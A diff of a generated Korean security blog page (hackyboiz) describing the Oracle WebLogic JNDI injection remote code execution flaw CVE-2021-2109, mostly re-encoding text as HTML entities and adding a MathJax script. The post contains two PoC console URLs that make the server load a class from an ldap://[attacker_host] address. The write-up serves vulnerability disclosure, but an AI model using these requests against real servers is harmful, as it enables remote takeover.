@@ -61,7 +61,7 @@
   <script src="/js/utils.js"></script>
   <script src="/js/color-schema.js"></script>
 
-<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/rss2.xml" title="hackyboiz" type="application/rss+xml">
+<meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/rss2.xml" title="hackyboiz" type="application/rss+xml">
 </head>
 
 <body>
@@ -189,7 +189,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      256 자
+      471 자
     </span>
   
 
@@ -199,7 +199,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      5
+      9
        분
     </span>
   
@@ -241,37 +241,35 @@
                    (adsbygoogle = window.adsbygoogle || []).push({});
               </script>
               <h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://mp.weixin.qq.com/s/wX9TMXl1KVWwB_k6EZOklw">Weblogic Server remote code execution vulnerability warning (CVE-2021-2109)</a></p>
-<h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Oracle WebLogic Server 10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0 및 14.1.1.0.0</p>
-<h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>오라클이 개발한 자바 웹 애플리케이션 서버인 Oracle WebLogic Server에서 JNDI Injection을 통한 원격 코드 실행 취약점의 세부 정보가 공개되었습니다.</p>
+<h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Oracle WebLogic Server 10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0 &#xBC0F; 14.1.1.0.0</p>
+<h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xC624;&#xB77C;&#xD074;&#xC774; &#xAC1C;&#xBC1C;&#xD55C; &#xC790;&#xBC14; &#xC6F9; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158; &#xC11C;&#xBC84;&#xC778; Oracle WebLogic Server&#xC5D0;&#xC11C; JNDI Injection&#xC744; &#xD1B5;&#xD55C; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589; &#xCDE8;&#xC57D;&#xC810;&#xC758; &#xC138;&#xBD80; &#xC815;&#xBCF4;&#xAC00; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
 <blockquote>
-<p>JNDI(Java Naming and Directory Interface) : 자바 애플리케이션에서 외부 디렉터리 서비스에 접근하기 위한 API로, 원격 서버의 객체를 bind 해 애플리케이션에서 접근할 수 있다.</p>
+<p>JNDI(Java Naming and Directory Interface) : &#xC790;&#xBC14; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC5D0;&#xC11C; &#xC678;&#xBD80; &#xB514;&#xB809;&#xD130;&#xB9AC; &#xC11C;&#xBE44;&#xC2A4;&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xAE30; &#xC704;&#xD55C; API&#xB85C;, &#xC6D0;&#xACA9; &#xC11C;&#xBC84;&#xC758; &#xAC1D;&#xCCB4;&#xB97C; bind &#xD574; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC5D0;&#xC11C; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xB2E4;.</p>
 </blockquote>
-<p>해당 취약점은 두 클래스에서 발생하며 취약점이 발생하는 첫 번째 클래스인 <code>com.bea.console.handles.JndiBindingHandle</code> 에서는 바인딩할 JNDI의 <code>context</code>, <code>bindName</code>, <code>serverName</code> 정보를 파라미터로 받아 이를 인스턴스화 하고 <code>JNDIBindingAction</code>에서 처리합니다. 각 파라미터의 의미와 공격 조건은 다음과 같습니다.</p>
+<p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xB450; &#xD074;&#xB798;&#xC2A4;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD558;&#xBA70; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xCCAB; &#xBC88;&#xC9F8; &#xD074;&#xB798;&#xC2A4;&#xC778; <code>com.bea.console.handles.JndiBindingHandle</code> &#xC5D0;&#xC11C;&#xB294; &#xBC14;&#xC778;&#xB529;&#xD560; JNDI&#xC758; <code>context</code>, <code>bindName</code>, <code>serverName</code> &#xC815;&#xBCF4;&#xB97C; &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xB85C; &#xBC1B;&#xC544; &#xC774;&#xB97C; &#xC778;&#xC2A4;&#xD134;&#xC2A4;&#xD654; &#xD558;&#xACE0; <code>JNDIBindingAction</code>&#xC5D0;&#xC11C; &#xCC98;&#xB9AC;&#xD569;&#xB2C8;&#xB2E4;. &#xAC01; &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xC758; &#xC758;&#xBBF8;&#xC640; &#xACF5;&#xACA9; &#xC870;&#xAC74;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
 <ul>
-<li><p><code>context</code> : 원격 바인딩할 JNDI 서버 호스트</p>
+<li><p><code>context</code> : &#xC6D0;&#xACA9; &#xBC14;&#xC778;&#xB529;&#xD560; JNDI &#xC11C;&#xBC84; &#xD638;&#xC2A4;&#xD2B8;</p>
 <ul>
-<li>JNDI 서버로 구성한 해커의 호스트</li>
+<li>JNDI &#xC11C;&#xBC84;&#xB85C; &#xAD6C;&#xC131;&#xD55C; &#xD574;&#xCEE4;&#xC758; &#xD638;&#xC2A4;&#xD2B8;</li>
 </ul>
 </li>
-<li><p><code>bindName</code>: 바인딩할 JNDI 클래스 이름</p>
+<li><p><code>bindName</code>: &#xBC14;&#xC778;&#xB529;&#xD560; JNDI &#xD074;&#xB798;&#xC2A4; &#xC774;&#xB984;</p>
 <ul>
-<li>악성 코드를 실행하는 java 클래스 파일 이름</li>
+<li>&#xC545;&#xC131; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xB294; java &#xD074;&#xB798;&#xC2A4; &#xD30C;&#xC77C; &#xC774;&#xB984;</li>
 </ul>
 </li>
-<li><p><code>serverName</code> : 바인딩할 서버 이름</p>
+<li><p><code>serverName</code> : &#xBC14;&#xC778;&#xB529;&#xD560; &#xC11C;&#xBC84; &#xC774;&#xB984;</p>
 <ul>
 <li><code>AdminServer</code></li>
 </ul>
 </li>
-<li><p>각 필드는 세미콜론 <code>;</code>으로 구분됩니다.</p>
-<br>
-
-</li>
+<li><p>&#xAC01; &#xD544;&#xB4DC;&#xB294; &#xC138;&#xBBF8;&#xCF5C;&#xB860; <code>;</code>&#xC73C;&#xB85C; &#xAD6C;&#xBD84;&#xB429;&#xB2C8;&#xB2E4;.</p>
+<br></li>
 </ul>
-<p>해커의 서버 포트 1088에 악성 코드를 실행하는 java 클래스 파일 <code>exploit</code> 이 존재한다면 PoC는 아래와 같습니다.</p>
+<p>&#xD574;&#xCEE4;&#xC758; &#xC11C;&#xBC84; &#xD3EC;&#xD2B8; 1088&#xC5D0; &#xC545;&#xC131; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xB294; java &#xD074;&#xB798;&#xC2A4; &#xD30C;&#xC77C; <code>exploit</code> &#xC774; &#xC874;&#xC7AC;&#xD55C;&#xB2E4;&#xBA74; PoC&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
 <pre><code class="hljs java">http:<span class="hljs-comment">//[victim_host]/console/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&amp;_nfpb=true&amp;JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(&quot;ldap://[attacker_host];1:1088/exploit;AdminServer&quot;)</span></code></pre>
 
-<p>두 번째  <code>com.bea.console.handles.JndiContextHandle</code> 클래스에서는 <code>bindName</code>이 포함된 <code>context</code>와 <code>serverName</code>만을 받아 위와 동일한 환경에서 다음 PoC로 원격 코드 실행이 가능합니다.</p>
+<p>&#xB450; &#xBC88;&#xC9F8;  <code>com.bea.console.handles.JndiContextHandle</code> &#xD074;&#xB798;&#xC2A4;&#xC5D0;&#xC11C;&#xB294; <code>bindName</code>&#xC774; &#xD3EC;&#xD568;&#xB41C; <code>context</code>&#xC640; <code>serverName</code>&#xB9CC;&#xC744; &#xBC1B;&#xC544; &#xC704;&#xC640; &#xB3D9;&#xC77C;&#xD55C; &#xD658;&#xACBD;&#xC5D0;&#xC11C; &#xB2E4;&#xC74C; PoC&#xB85C; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p>
 <pre><code class="hljs java">http:<span class="hljs-comment">//[victim_host]/console/console.portal?_nfpb=true&amp;_pageLabel=EJBTestHomePage&amp;EJBTestHomePagehandle=com.bea.console.handles.JndiContextHandle(&quot;ldap://[attacker_host]:1088/exploit;AdminServer&quot;)</span></code></pre>
 
 
@@ -579,6 +577,45 @@
 
 
 
+
+  
+
+  
+    <!-- MathJax -->
+    <script>
+      MathJax = {
+        tex: {
+          inlineMath: [['$', '$'], ['\\(', '\\)']]
+        },
+        options: {
+          renderActions: {
+            findScript: [10, doc => {
+              document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+                const display = !!node.type.match(/; *mode=display/);
+                const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+                const text = document.createTextNode('');
+                node.parentNode.replaceChild(text, node);
+                math.start = { node: text, delim: '', n: 0 };
+                math.end = { node: text, delim: '', n: 0 };
+                doc.math.push(math);
+              });
+            }, '', false],
+            insertedScript: [200, () => {
+              document.querySelectorAll('mjx-container').forEach(node => {
+                let target = node.parentNode;
+                if (target.nodeName.toLowerCase() === 'li') {
+                  target.parentNode.classList.add('has-jax');
+                }
+              });
+            }, '', false]
+          }
+        }
+      };
+    </script>
+
+    <script async src="https://cdn.staticfile.org/mathjax/3.0.5/es5/tex-svg.js"></script>
+
+  
 
 
 
